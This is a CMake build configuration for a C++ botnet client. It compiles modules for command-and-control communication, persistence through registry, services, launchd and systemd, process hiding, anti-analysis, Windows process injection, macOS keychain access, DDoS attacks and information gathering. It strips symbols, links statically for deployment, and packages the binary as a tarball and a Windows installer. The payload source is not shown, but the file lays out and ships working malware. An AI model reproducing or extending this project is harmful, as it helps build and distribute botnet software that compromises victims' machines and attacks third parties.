cmake_minimum_required(VERSION 3.16)
project(BotnetClient VERSION 1.0.0 LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Compiler-specific options
if(MSVC)
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} /W4")
    # Static linking for Windows deployment
    set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
else()
    set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -Wextra -pedantic")
    # Static linking for Linux/macOS deployment
    set(CMAKE_EXE_LINKER_FLAGS "-static-libgcc -static-libstdc++")
endif()

# Build types
set(CMAKE_BUILD_TYPE Release CACHE STRING "Build type")
set_property(CACHE CMAKE_BUILD_TYPE PROPERTY STRINGS "Debug" "Release" "MinSizeRel" "RelWithDebInfo")

# Platform detection
if(WIN32)
    set(PLATFORM_NAME "windows")
    add_definitions(-DPLATFORM_WINDOWS)
elseif(APPLE)
    set(PLATFORM_NAME "macos")
    add_definitions(-DPLATFORM_MACOS)
elseif(UNIX)
    set(PLATFORM_NAME "linux")
    add_definitions(-DPLATFORM_LINUX)
endif()

# Find required packages
find_package(Boost REQUIRED COMPONENTS system thread filesystem)
find_package(OpenSSL REQUIRED)
find_package(Threads REQUIRED)

# Include directories
include_directories(
    ${CMAKE_SOURCE_DIR}/src
    ${CMAKE_SOURCE_DIR}/../common
    ${Boost_INCLUDE_DIRS}
    ${OPENSSL_INCLUDE_DIR}
)

# Common library (shared between bot client and C2 server)
add_subdirectory(../common common)

# Bot client source files
set(CLIENT_SOURCES
    src/main.cpp
    src/bot_client.cpp
    src/communication/c2_client.cpp
    src/communication/protocol_handler.cpp
    src/persistence/startup_manager.cpp
    src/persistence/process_manager.cpp
    src/stealth/process_hiding.cpp
    src/stealth/anti_analysis.cpp
    src/modules/module_manager.cpp
    src/modules/ddos_module.cpp
    src/modules/info_gathering.cpp
    src/config/config_manager.cpp
    src/utils/platform_utils.cpp
    src/utils/crypto_utils.cpp
)

# Platform-specific source files
if(WIN32)
    list(APPEND CLIENT_SOURCES
        src/platform/windows/registry_manager.cpp
        src/platform/windows/service_manager.cpp
        src/platform/windows/process_injection.cpp
    )
elseif(APPLE)
    list(APPEND CLIENT_SOURCES
        src/platform/macos/launchd_manager.cpp
        src/platform/macos/keychain_utils.cpp
    )
elseif(UNIX)
    list(APPEND CLIENT_SOURCES
        src/platform/linux/systemd_manager.cpp
        src/platform/linux/proc_utils.cpp
    )
endif()

# Create bot client executable
add_executable(botnet-client ${CLIENT_SOURCES})

# Link libraries
target_link_libraries(botnet-client
    PRIVATE
    common-library
    ${Boost_LIBRARIES}
    ${OPENSSL_LIBRARIES}
    Threads::Threads
)

# Platform-specific linking
if(WIN32)
    target_link_libraries(botnet-client PRIVATE ws2_32 wininet advapi32 shell32)
elseif(APPLE)
    target_link_libraries(botnet-client PRIVATE "-framework CoreFoundation" "-framework Security")
endif()

# Compiler definitions for build configuration
target_compile_definitions(botnet-client PRIVATE
    $<$<CONFIG:Debug>:DEBUG_BUILD>
    $<$<CONFIG:Release>:RELEASE_BUILD>
    CLIENT_VERSION="${PROJECT_VERSION}"
    PLATFORM_NAME="${PLATFORM_NAME}"
)

# Enable security features for release builds
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    # Enable control flow guard on Windows
    if(MSVC)
        target_compile_options(botnet-client PRIVATE /guard:cf)
        target_link_options(botnet-client PRIVATE /guard:cf)
    endif()
    
    # Strip symbols for smaller executable
    if(NOT WIN32)
        target_link_options(botnet-client PRIVATE -s)
    endif()
endif()

# Installation and packaging
install(TARGETS botnet-client
    RUNTIME DESTINATION bin
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib/static
)

# Create deployment package
set(PACKAGE_DIR "${CMAKE_BINARY_DIR}/package")
set(PACKAGE_NAME "botnet-client-${PLATFORM_NAME}-${PROJECT_VERSION}")

# Custom target for creating deployment package
add_custom_target(package
    COMMAND ${CMAKE_COMMAND} -E make_directory ${PACKAGE_DIR}/${PACKAGE_NAME}
    COMMAND ${CMAKE_COMMAND} -E copy $<TARGET_FILE:botnet-client> ${PACKAGE_DIR}/${PACKAGE_NAME}/
    COMMAND ${CMAKE_COMMAND} -E copy ${CMAKE_SOURCE_DIR}/deploy/README.txt ${PACKAGE_DIR}/${PACKAGE_NAME}/
    COMMAND ${CMAKE_COMMAND} -E copy ${CMAKE_SOURCE_DIR}/deploy/LICENSE.txt ${PACKAGE_DIR}/${PACKAGE_NAME}/
    COMMAND ${CMAKE_COMMAND} -E tar czf ${PACKAGE_DIR}/${PACKAGE_NAME}.tar.gz -C ${PACKAGE_DIR} ${PACKAGE_NAME}
    DEPENDS botnet-client
    COMMENT "Creating deployment package: ${PACKAGE_NAME}.tar.gz"
)

# Windows-specific installer target
if(WIN32)
    add_custom_target(installer
        COMMAND ${CMAKE_COMMAND} -E echo "Building Windows installer..."
        COMMAND makensis /DVERSION=${PROJECT_VERSION} ${CMAKE_SOURCE_DIR}/installers/windows/installer.nsi
        DEPENDS botnet-client
        COMMENT "Creating Windows installer"
    )
endif()

# Cross-compilation helpers
if(CMAKE_CROSSCOMPILING)
    message(STATUS "Cross-compiling for ${CMAKE_SYSTEM_NAME}")
    message(STATUS "Target architecture: ${CMAKE_SYSTEM_PROCESSOR}")
endif()

# Build configuration summary
message(STATUS "Build configuration:")
message(STATUS "  Platform: ${PLATFORM_NAME}")
message(STATUS "  Build type: ${CMAKE_BUILD_TYPE}")
message(STATUS "  C++ standard: ${CMAKE_CXX_STANDARD}")
message(STATUS "  Boost version: ${Boost_VERSION}")
message(STATUS "  OpenSSL version: ${OPENSSL_VERSION}")
